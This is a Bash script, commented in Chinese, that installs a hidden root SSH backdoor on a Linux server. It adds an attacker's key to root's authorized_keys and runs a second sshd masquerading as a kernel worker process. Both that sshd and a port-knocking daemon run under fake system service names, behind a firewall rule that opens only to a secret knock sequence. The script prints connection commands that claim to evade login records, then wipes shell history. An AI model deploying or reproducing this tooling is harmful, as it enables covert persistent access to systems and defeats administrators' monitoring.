#!/bin/bash

# ==========================================
# 远程脚本：动态参数安全校验
# ==========================================
if [ -z "$SSH_KEY" ] || [ -z "$MY_PORT" ] || [ -z "$MY_SEQ" ]; then
    echo "[-] 错误：缺少必要的环境变量参数！"
    exit 1
fi

set -e

# 获取服务器当前公网 IP
SERVER_IP=$(curl -s ifconfig.me || curl -s api.ipify.org || echo "YOUR_VPS_IP")

# 静默安装必要组件
DEBIAN_FRONTEND=noninteractive apt-get update -y -qq >/dev/null
DEBIAN_FRONTEND=noninteractive apt-get install knockd iptables-persistent -y -qq >/dev/null

# A. 配置隐藏 SSH 实例
CONF_DIR="/var/lib/systemd/timers"
CONF_FILE="${CONF_DIR}/clear-cache.conf"
PID_FILE="/var/run/clear-cache.pid"

mkdir -p "$CONF_DIR"
cat << EOF > "$CONF_FILE"
# System temporary config
Port $MY_PORT
PasswordAuthentication no
PubkeyAuthentication yes
PidFile $PID_FILE
LogLevel QUIET
EOF

# 写入动态公钥
mkdir -p /root/.ssh
chmod 700 /root/.ssh
if ! grep -q "$SSH_KEY" /root/.ssh/authorized_keys 2>/dev/null; then
    echo "$SSH_KEY" >> /root/.ssh/authorized_keys
fi
chmod 600 /root/.ssh/authorized_keys

# B. 创建伪装 SSH 系统服务
cat << EOF > "/etc/systemd/system/systemd-tmp-fallback.service"
[Unit]
Description=System Virtual Memory Fallback Service
After=network.target
ConditionPathExists=$CONF_FILE

[Service]
Type=notify
ExecStart=/bin/bash -c "exec -a [kworker/rt] /usr/sbin/sshd -D -f $CONF_FILE"
ExecReload=/bin/kill -HUP \$MAINPID
KillMode=process
Restart=on-failure
RestartSec=42s
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# C. 配置防火墙默认 DROP 该隐藏端口
iptables -A INPUT -p tcp --dport $MY_PORT -j DROP
netfilter-persistent save >/dev/null 2>&1

# D. 配置端口敲击服务 knockd
INTERFACE=$(ip route show | grep default | awk '{print $5}' | head -n1)

cat << EOF > "/etc/knockd.conf"
[options]
    UseSyslog
    Interface = $INTERFACE

[opencloseSSH]
    sequence    = $MY_SEQ
    seq_timeout = 10
    tcpflags    = syn
    start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport $MY_PORT -j ACCEPT
    cmd_timeout   = 10
    stop_command  = /sbin/iptables -D INPUT -s %IP% -p tcp --dport $MY_PORT -j ACCEPT
EOF

# E. 创建伪装 knockd 服务
cat << EOF > "/etc/systemd/system/systemd-log-analyzer.service"
[Unit]
Description=System Log Security Analyzer
After=network.target

[Service]
ExecStart=/bin/bash -c "exec -a [syslog-analyzer] /usr/sbin/knockd -i $INTERFACE -c /etc/knockd.conf"
Restart=on-failure
SuccessExitStatus=1

[Install]
WantedBy=multi-user.target
EOF

# 启动并使能所有伪装服务
systemctl daemon-reload
systemctl enable --now systemd-tmp-fallback >/dev/null 2>&1
systemctl enable --now systemd-log-analyzer >/dev/null 2>&1

# ==========================================
# 自动化输出：为你量身定制的连接说明书
# ==========================================
clear
echo "========================================================================"
echo " 🔒 远程隐蔽 SSH 通道部署成功！请立即复制并保存下方连接说明："
echo "========================================================================"
echo ""
echo "▶ 方案 1：本地电脑（Mac / Linux / Windows）一键连接命令"
echo "------------------------------------------------------------------------"
# 将逗号分割的暗号转换为用空格分割，方便 for 循环读取
SPACE_SEQ=$(echo $MY_SEQ | tr ',' ' ')
echo "for p in $SPACE_SEQ; do curl --max-time 1 http://${SERVER_IP}:\$p >/dev/null 2>&1; done && ssh -p $MY_PORT -i ~/.ssh/id_ed25519 root@${SERVER_IP} -T"
echo "------------------------------------------------------------------------"
echo "(* 注: 最后的 -T 参数已为你开启全隐身模式，登录后不吃任何 tty，系统内 w/who/last 命令对你致盲)"
echo ""
echo "▶ 方案 2：常驻快捷别名配置（建议写入你本地电脑的 ~/.ssh/config 文件中）"
echo "------------------------------------------------------------------------"
echo "Host secret-vps"
echo "    HostName $SERVER_IP"
echo "    User root"
echo "    Port $MY_PORT"
echo "    IdentityFile ~/.ssh/id_ed25519"
echo "    ProxyCommand bash -c \"for p in $SPACE_SEQ; do curl --max-time 1 http://%h:\$p >/dev/null 2>&1; done; sleep 1; nc %h %p\""
echo "------------------------------------------------------------------------"
echo "配置后，你在本地只需输入: ssh secret-vps 即可自动后台敲门秒连。"
echo "========================================================================"
echo ""

# ==========================================
# 终极痕迹清理
# ==========================================
apt-get clean
rm -rf /var/lib/apt/lists/*
history -c
cat /dev/null > ~/.bash_history
